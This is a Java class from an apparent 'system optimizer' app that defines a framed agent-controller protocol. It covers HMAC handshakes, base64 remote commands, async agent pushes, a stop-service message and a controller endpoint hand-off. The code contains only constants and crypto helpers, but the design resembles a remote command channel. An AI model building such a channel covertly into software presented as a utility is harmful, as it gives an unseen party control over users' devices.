package com.example.systemoptimizer;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

/**
 * Control-protocol constants and helpers for the modern (v2) framing.
 *
 * Frame format is unchanged (4-byte big-endian length + UTF-8) so the wire
 * stays binary-compatible. The v2 messages multiplexed on top of the framing:
 *
 *   AGENT_HELLO|<id>|<proto>|<ver>|<nonce>|<auth>|<caps>|<state>   agent -> controller
 *   HELLO_OK|<proto>|<ver>|<nonceSrv>|<authSrv>[|<TOKEN=...>]      controller -> agent
 *   AUTH_DENIED|<reason>                                           controller -> agent
 *   PING|<seq>      ->    PONG|<seq>                               heartbeat
 *   cmd|<id>|<b64>  ->    ACK|<id> ; RESULT|<id>|OK|<b64> | RESULT|<id>|ERR|<b64>
 *   NOTIFY|<b64>                                                  async agent push
 *   STATE_REQ|<id>  ->    RESULT|<id>|OK|<b64>
 *   CTRL_EXIT|...   ->    agent stops its background service
 *   SET_CTRL|<ip>|<port>                                          endpoint hand-off
 *
 * Authentication: the device token (32 random bytes) is never sent on the
 * wire after pairing. The agent proves possession with
 *   auth  = HMAC-SHA256(token, deviceId + ":" + nonce)
 * and the controller proves possession with
 *   authSrv = HMAC-SHA256(token, "hellook:" + nonce)
 */
public final class AgentProtocol {

    private AgentProtocol() {
    }

    public static final String PREFIX_HELLO = "AGENT_HELLO|";
    public static final String PREFIX_HELLO_OK = "HELLO_OK|";
    public static final String PREFIX_AUTH_DENIED = "AUTH_DENIED|";
    public static final String PREFIX_PING = "PING|";
    public static final String PREFIX_CMD = "cmd|";
    public static final String PREFIX_ACK = "ACK|";
    public static final String PREFIX_RESULT = "RESULT|";
    public static final String PREFIX_NOTIFY = "NOTIFY|";
    public static final String PREFIX_STATE_REQ = "STATE_REQ|";
    public static final String PREFIX_CTRL_EXIT = "CTRL_EXIT";
    public static final String PREFIX_SET_CTRL = "SET_CTRL|";
    public static final String AUTH_PAIR_MARKER = "PAIR";

    public static final int HELLO_REPLY_TIMEOUT_MS = 8000;

    /** Hex-encoded HMAC-SHA256 over (data) with (secret). */
    public static String hmacHex(byte[] secret, String data) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(secret, "HmacSHA256"));
            byte[] out = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(out.length * 2);
            for (byte b : out) {
                sb.append(Character.forDigit((b >> 4) & 0xF, 16));
                sb.append(Character.forDigit(b & 0xF, 16));
            }
            return sb.toString();
        } catch (Exception e) {
            throw new IllegalStateException("HMAC unavailable", e);
        }
    }

    /** Constant-time HMAC comparison. */
    public static boolean hmacEquals(String expected, String actual) {
        if (expected == null || actual == null) {
            return false;
        }
        return MessageDigest.isEqual(expected.getBytes(StandardCharsets.UTF_8),
                actual.getBytes(StandardCharsets.UTF_8));
    }

    public static String base64(String text) {
        return java.util.Base64.getEncoder().encodeToString(
                text.getBytes(StandardCharsets.UTF_8));
    }

    public static String unbase64(String b64) {
        try {
            return new String(java.util.Base64.getDecoder().decode(b64), StandardCharsets.UTF_8);
        } catch (IllegalArgumentException e) {
            return null;
        }
    }

    /** Build agent handshake: id|proto|ver|nonce|auth|caps|state. */
    public static String buildHello(String deviceId, String proto, String ver,
                                    String nonce, String auth, String caps, String state) {
        return PREFIX_HELLO + deviceId + "|" + proto + "|" + ver + "|"
                + nonce + "|" + auth + "|" + caps + "|" + state;
    }
}